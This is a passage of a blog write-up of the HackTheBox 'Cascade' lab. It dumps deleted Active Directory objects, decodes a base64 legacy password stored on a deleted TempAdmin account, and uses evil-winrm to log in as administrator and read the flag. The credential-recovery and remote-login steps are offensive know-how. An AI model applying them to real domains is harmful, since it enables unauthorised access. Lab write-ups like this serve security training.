<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">groupPolicyContainer</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="n">ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">showInAdvancedViewOnly</span>          <span class="p">:</span> <span class="no">True</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">196701</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">196688</span>
<span class="n">versionNumber</span>                   <span class="p">:</span> <span class="mi">2</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span> <span class="no">AM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">Machine</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">Machine</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Machine</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">Machine</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">Machine</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">container</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">93</span><span class="n">c23674</span><span class="o">-</span><span class="n">e411</span><span class="o">-</span><span class="mi">400</span><span class="n">b</span><span class="o">-</span><span class="n">bb9f</span><span class="o">-</span><span class="n">c0340bda5a34</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">showInAdvancedViewOnly</span>          <span class="p">:</span> <span class="no">True</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">196699</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">196689</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">User</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">User</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">User</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="ss">:ff5c2fdc</span><span class="o">-</span><span class="n">cc11</span><span class="o">-</span><span class="mf">44e3</span><span class="o">-</span><span class="n">ae4c</span><span class="o">-</span><span class="mo">071</span><span class="n">aab2ccc6e</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">User</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">User</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">container</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">746385</span><span class="n">f2</span><span class="o">-</span><span class="n">e3a0</span><span class="o">-</span><span class="mi">4252</span><span class="o">-</span><span class="n">b83a</span><span class="o">-</span><span class="mi">5</span><span class="n">a206da0ed88</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">showInAdvancedViewOnly</span>          <span class="p">:</span> <span class="no">True</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">196700</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">196690</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">52</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">2</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">31</span> <span class="no">AM</span>

<span class="n">accountExpires</span>                  <span class="p">:</span> <span class="mi">9223372036854775807</span>
<span class="n">badPasswordTime</span>                 <span class="p">:</span> <span class="mi">0</span>
<span class="n">badPwdCount</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">TempAdmin</span>
                                  <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">cascadeLegacyPwd</span>                <span class="p">:</span> <span class="no">YmFDVDNyMWFOMDBkbGVz</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">TempAdmin</span>
                                  <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">codePage</span>                        <span class="p">:</span> <span class="mi">0</span>
<span class="n">countryCode</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">TempAdmin</span><span class="o">&lt;!</span><span class="no">JEKYLL</span><span class="err">@</span><span class="mi">7000</span><span class="err">@</span><span class="mi">50</span><span class="o">&gt;</span><span class="no">ADEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">givenName</span>                       <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">OU</span><span class="o">=</span><span class="no">Users</span><span class="p">,</span><span class="no">OU</span><span class="o">=</span><span class="no">UK</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">lastLogoff</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="n">lastLogon</span>                       <span class="p">:</span> <span class="mi">0</span>
<span class="n">logonCount</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">34</span> <span class="no">AM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">34</span> <span class="no">AM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">TempAdmin</span>
                                  <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">user</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="n">f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="n">objectSid</span>                       <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3332504370</span><span class="o">-</span><span class="mi">1206983947</span><span class="o">-</span><span class="mi">1165150453</span><span class="o">-</span><span class="mi">1136</span>
<span class="n">primaryGroupID</span>                  <span class="p">:</span> <span class="mi">513</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">pwdLastSet</span>                      <span class="p">:</span> <span class="mi">132245689883479503</span>
<span class="n">sAMAccountName</span>                  <span class="p">:</span> <span class="no">TempAdmin</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">userAccountControl</span>              <span class="p">:</span> <span class="mi">66048</span>
<span class="n">userPrincipalName</span>               <span class="p">:</span> <span class="no">TempAdmin</span><span class="vi">@cascade</span><span class="p">.</span><span class="nf">local</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">237705</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">237695</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">34</span> <span class="no">AM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">27</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">08</span> <span class="no">AM</span>
</code></pre></div></div>
<hr>

<p>Found the <code class="language-plaintext highlighter-rouge">cascadeLegacyPwd</code> of <code class="language-plaintext highlighter-rouge">Tempadmin</code></p>

<p><code class="language-plaintext highlighter-rouge">cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></p>

<hr>

<h3 id="time-to-decode">Time to decode..</h3>

<p><code class="language-plaintext highlighter-rouge">echo YmFDVDNyMWFOMDBkbGVz|base64 -d </code>
<code class="language-plaintext highlighter-rouge">baCT3r1aN00dles</code>
—</p>

<h2 id="logging-as-admin">Logging as ADMIN</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="nb">p</span> <span class="n">baCT3r1aN00dles</span>

<span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="o">.</span><span class="mi">0</span>

<span class="no">Info</span><span class="p">:</span> <span class="no">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="getting-roottxt">Getting Root.txt</h2>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="o">..</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="no">Desktop</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Desktop</span><span class="o">&gt;</span> <span class="n">type</span> <span class="n">root</span><span class="p">.</span><span class="nf">txt</span>
<span class="mi">930</span><span class="o">****************************</span><span class="n">b35b</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">Administrator</span><span class="p">\</span><span class="no">Desktop</span>
</code></pre></div></div>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br>
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>


    </div>

</article>
<div class="post-nav">
<a class="previous" href="/otherposts/2020/06/24/Ganana.html" title="VulnHub GANANA">VulnHub GANANA</a><a class="next" href="/hackthebox/2020/06/30/Blunder.html" title="HackTheBox Blunder">HackTheBox Blunder</a>
</div>
<div class="post-related">
      <div>Related Articles</div>
      <ul>
        <li><a class="post-link" href="/hackthebox/retired/2020/03/09/Legacy.html" title="HackTheBox Blunder">HackTheBox Legacy</a></li>
<li><a class="post-link" href="/hackthebox/2020/06/30/Blunder.html" title="HackTheBox Blunder">HackTheBox Blunder</a></li>
<li><a class="post-link" href="/hackthebox/2020/07/23/Buff.html" title="HackTheBox Blunder">HackTheBox Buff</a></li>
<li><a class="post-link" href="/tryhackme/2020/07/08/Haskhell.html" title="HackTheBox Blunder">Tryhackme Haskhell</a></li>
</ul>
    </div>
<div class="post-comments"></div></section>
</div>


  </section>
  <section class="sidebar" style="margin-left: 15px;">
    <!-- Get sidebar items --><style type="text/css" media="screen">
.post-menu ul {
  list-style: none;
  padding: 0;
  margin: 0;
}
</style>

<div class="post-menu">
  <div class="post-menu-title"> Contents</div>
  <div class="post-menu-content"></div>
</div>

<script>
  function generateContent() {
    var menu = document.querySelector(".post-menu");
    var menuContent =  menu.querySelector(".post-menu-content");
    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");

    // Hide menu when no headings
    if (headings.length === 0) {
      return menu.style.display = "none";
    }

    // Generate post menu
    var menuHTML = '';
    for (var i = 0; i < headings.length; i++) {
      var h = headings[i];
      menuHTML += (
        '<li class="h-' + h.tagName.toLowerCase() + '">'
        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
    }

    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';

    // The header element
    var header = document.querySelector('header.site-header');

    function doMenuCollapse(index, over_items) {
      var items = menuContent.firstChild.children;

      if (over_items == undefined) {
        over_items = 20;
      }

      if (items.length < over_items) {
        return;
      }

      var activeItem = items[index];
      var beginItem = activeItem
      var endItem = activeItem
      var beginIndex = index;
      var endIndex = index + 1;
      while (beginIndex >= 0
        && !items[beginIndex].classList.contains('h-h2')) {
        beginIndex -= 1;
      }
      while (endIndex < items.length
        && !items[endIndex].classList.contains('h-h2')) {
        endIndex += 1;
      }
      for (var i = 0; i < beginIndex; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
      for (var i = beginIndex + 1; i < endIndex; i++) {
        item = items[i]
        // if (!item.classList.contains('h-h2')) {
          item.style.display = '';
        // }
      }
      for (var i = endIndex; i < items.length; i++) {
        item = items[i]
        if (!item.classList.contains('h-h2')) {
          item.style.display = 'none';
        }
      }
    }

    // Init menu collapsed
    doMenuCollapse(-1);

    // Active the menu item
    window.addEventListener('scroll', function (event) {
      var lastActive = menuContent.querySelector('.active');
      var changed = true;
      var activeIndex = -1;
      for (var i = headings.length - 1; i >= 0; i--) {
        var h = headings[i];
        var headingRect = h.getBoundingClientRect();
        var headerRect = header.getBoundingClientRect();
        var headerTop = Math.floor(headerRect.top);
        var headerHeight = Math.floor(headerRect.height);
        var headerHeight = headerTop + headerHeight + 20;
        if (headingRect.top <= headerHeight) {
          var id = 'h-' + h.getAttribute('id');
          var a = menuContent.querySelector('a[href="#' + id  + '"]');
          var curActive = a.parentNode;
          if (curActive) {
            curActive.classList.add('active');
            activeIndex = i;
          }
          if (lastActive == curActive) {
            changed = false;
          }
          break;
        }
      }
      if (changed) {
        if (lastActive) {
          lastActive.classList.remove('active');
        }
        doMenuCollapse(activeIndex);
      }
      event.preventDefault();
    });
  }
  generateContent();
</script>
</section>
</div>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">
    <div class="site-footer-inner">
      <div>Copyright © 2020-2022 @Jeevan</div>
      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
      
    </div>
  </div>
</footer>
</body>
</html>
